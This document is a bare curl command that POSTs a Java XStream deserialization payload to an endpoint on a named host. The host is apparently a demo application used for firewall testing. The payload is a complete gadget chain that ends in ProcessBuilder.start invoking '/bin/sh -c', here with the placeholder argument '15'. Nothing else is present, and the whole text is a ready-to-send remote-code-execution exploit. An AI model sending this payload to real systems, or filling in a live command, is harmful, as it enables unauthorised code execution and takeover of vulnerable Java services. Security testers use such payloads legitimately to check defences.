curl --location -g --request POST 'http://arcadia-api.gke.nginx.rocks/index.php' \
--header 'Content-Type: text/plain' \
--data-raw '                <map>
                <entry>
                <jdk.nashorn.internal.objects.NativeString>
                <flags>0</flags>
                <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                <is class="javax.crypto.CipherInputStream">
                <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                <iter class="javax.imageio.spi.FilterIterator">
                <iter class="java.util.Collections$EmptyIterator"/>
                <next class="java.lang.ProcessBuilder">
                <command>
                <string>/bin/sh</string><string>-c</string><string>15</string>
                </command>
                <redirectErrorStream>false</redirectErrorStream>
                </next>
                </iter>
                <filter class="javax.imageio.ImageIO$ContainsFilter">
                <method>
                <class>java.lang.ProcessBuilder</class>
                <name>start</name>
                <parameter-types/>
                </method>
                <name>foo</name>
                </filter>
                <next class="string">foo</next>
                </serviceIterator>
                <lock/>
                </cipher>
                <input class="java.lang.ProcessBuilder$NullInputStream"/>
                <ibuffer/>
                <done>false</done>
                <ostart>0</ostart>
                <ofinish>0</ofinish>
                <closed>false</closed>
                </is>
                <consumed>false</consumed>
                </dataSource>
                <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
                </value>
                </jdk.nashorn.internal.objects.NativeString>
                <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
                </entry>
                <entry>
                <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                </entry>
                </map>'